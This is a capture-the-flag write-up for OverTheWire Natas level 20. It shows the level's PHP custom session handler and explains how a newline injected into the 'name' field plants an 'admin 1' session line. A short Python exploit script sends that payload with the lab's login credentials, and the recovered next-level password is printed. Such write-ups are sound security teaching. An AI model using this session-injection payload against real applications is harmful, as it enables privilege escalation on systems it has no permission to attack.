# Writeup level 20
In this challenge we are supposed to get admin access again. This time though we have to deal with a session file that gets created and loaded.

**Source Code**

```php
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?> 
```
Looking at the source code we can see that the only intresting part is the **mywrite()** and **myread()** functions. I tried to bypass the strspn + strlen function at first to load a diffrent file but that didn't seem to work. Then I noticed that the way how the data is read and written is abusive, because the session file would look something like that:  
key1 value1  
key2 value2  
key3 value3  
And **myread()** will load each line into the session.
So what if we inject our own line. Something like  
name admin  
admin  1  
We can inject it through the Your name: input field. To make a newline we are going to use **\n**.

**Exploit**  

```python
import requests

url = "http://natas20.natas.labs.overthewire.org/index.php?debug=true"
data={"name": "admin\nadmin 1"}

session = "23c8r2ca2gn5mk2180lnild036"

cookies = {'PHPSESSID': session}
r = requests.post(url, cookies=cookies,data=data, auth=("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"))

print(r.text)

# password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

The password is:  
IFekPyrQXftziDEsUr3x21sYuahypdgJ
